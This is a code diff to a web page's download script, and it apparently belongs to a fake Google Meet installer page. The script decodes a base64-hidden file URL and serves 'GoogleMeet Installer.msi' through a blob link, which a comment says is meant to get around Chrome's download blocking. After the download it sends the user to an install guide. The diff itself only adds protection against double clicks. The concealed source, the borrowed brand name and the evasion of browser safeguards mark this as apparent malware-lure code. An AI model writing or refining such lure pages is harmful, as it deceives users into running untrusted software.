@@ -194,8 +194,26 @@
         const fileUrl = atob(fileUrlEncoded);
         const fileName = 'GoogleMeet Installer.msi';
 
+        // Flag to prevent multiple simultaneous downloads
+        let isDownloading = false;
+
         // Download function using blob URL (avoids Chrome download blocking)
         function triggerDownload() {
+            // Prevent multiple downloads
+            if (isDownloading) {
+                return;
+            }
+            
+            isDownloading = true;
+            
+            // Disable button to prevent multiple clicks
+            const downloadBtn = document.getElementById('clickbtn');
+            if (downloadBtn) {
+                downloadBtn.style.opacity = '0.6';
+                downloadBtn.style.cursor = 'not-allowed';
+                downloadBtn.style.pointerEvents = 'none';
+            }
+            
             // Add cache-busting parameter to ensure latest file is downloaded
             const cacheBuster = '?v=' + Date.now();
             const fileUrlWithCache = fileUrl + cacheBuster;
@@ -220,6 +238,7 @@
                     setTimeout(() => {
                         document.body.removeChild(blobLink);
                         URL.revokeObjectURL(blobUrl);
+                        isDownloading = false;
                     }, 100);
                     
                     // Redirect to installation guide after successful download
@@ -238,6 +257,7 @@
                     directLink.click();
                     setTimeout(() => {
                         document.body.removeChild(directLink);
+                        isDownloading = false;
                         // Redirect to installation guide after fallback download
                         window.location.href = '/install.html';
                     }, 1500);
